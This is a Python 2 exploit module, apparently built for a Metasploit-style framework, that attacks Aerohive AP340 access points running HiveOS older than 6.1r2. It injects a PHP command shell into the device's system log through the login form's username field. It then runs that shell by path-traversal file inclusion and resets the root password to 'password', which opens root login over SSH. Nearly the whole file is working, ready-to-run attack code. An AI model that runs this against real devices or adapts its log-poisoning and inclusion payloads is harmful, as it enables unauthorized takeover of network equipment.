import sys, time, urllib
from urllib import urlopen
from socket import setdefaulttimeout
setdefaulttimeout(5)

def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "\nVulnrable Applications (%s)\n" %name
	print "  ID       Device"
	print "  --       ------"
	for _ in targetlist:
		print "  "+_+" "*(8-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("AreoHiveRCE","Strong","Remote File Execution for AreoHive")
except:
	pass

def auto_info(name,module,plat,priv,lic,rank,release="N/A",by="N/A"):
	print "\nPublisher Information for %s" %name
	print
	print "       Name:",name
	print "     Module:",module
	print "   Platform:",plat
	print " Privileged:",priv
	print "    License:",lic
	print "       Rank:",rank
	print "  Disclosed:",release
	print "         By:",by

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

def areopoison(wap_ip):
	for _ in range(1):
		payload_inject = "<?php if(isset($_REQUEST[\'cmd\'])){     $cmd = ($_REQUEST[\"cmd\"]);     system($cmd);     echo \"</pre>$cmd<pre>\";     die; } ?>"
		
		post_url= "/login.php5?version=6.1r2"
		post_fields = {"login_auth" : "1", "miniHiveUI" : "1", "userName" : payload_inject, "password" : "1234"}
		post_fields = urllib.quote_plus(str(post_fields))
		data = str(post_fields).encode('ascii')
		
		payload_lfi_url = "/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00&cmd="
		
		payload_command = "echo+root:password+|+/usr/sbin/chpasswd"
		
		payload_chpasswd = payload_lfi_url+payload_command
		
		print "\n* AeroHive AP340 HiveOS < 6.1r2 Root Exploit *\n"
		
		base_url = "http://" + wap_ip+":8080"
		
		print "Poisoning log file at /var/log/messages. . ."
		time.sleep(0.3)
		try:
			request = urlopen(base_url+post_url, data)
			json = urlopen(request.geturl()).read().decode()
		except:
			print "[*] Timeout Error"
			print
			break
		print "Interacting with PHP Shell. . ."
		time.sleep(0.88)
		content = urllib.urlopen(base_url+payload_chpasswd).read()
		if "assword for" in content.decode('ascii'):
			print "Remote Code Executed!"
			time.sleep(0.5)
			print "Login with root:password on SSH!"
		else:
			print "Exploit Failed"
		print

def show_opt():
	print "\nModule Options (exploits/AreoHiveRCE)\n"
	print "  Name     Current Setting  Required  Description"
	print "  ----     ---------------  --------  -----------"
	
	try:
		auto_opt("RHOST",RHOST,"yes", "Target Host")
	except:
		auto_opt("RHOST","   ","yes", "Target Host")
	print

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "proc":
		try:
			if RHOST:
				areopoison(RHOST)
		except:
			print "[*] Failed"
			print
			time.sleep(0.3)
except:
	pass

try:
	if desc == "get-info":
		auto_info(name,"exploit/AreoHiveRCE","Python 2.7","No","N/A","Strong","2017-05-22","Ike-Clinton")
		show_opt()
		targets = {"1":"AP340 HiveOS 6.1r2","2":"AP340 HiveOS < 6.1r5"}
		auto_targ(targets)
except:
	pass
